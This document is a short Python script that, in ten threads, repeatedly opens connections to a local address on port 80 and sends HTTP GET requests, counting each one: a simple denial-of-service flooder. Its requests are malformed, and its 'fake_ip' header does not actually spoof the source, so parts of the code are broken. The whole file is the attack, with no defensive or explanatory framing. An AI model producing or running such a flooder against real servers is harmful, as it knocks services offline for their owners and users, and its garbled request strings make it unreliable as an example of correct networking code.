import threading
import socket

target = '192.168.2.1'
port = 80
fake_ip = '192.168.2.100'

i = 0
def attack():
    try:
        while True:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((target, port))
            server.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
            server.sendto(('HOST /' + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))

            global i
            i += 1
            print(i)
            server.close()
    except Exception as e:
        print('End')


for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()
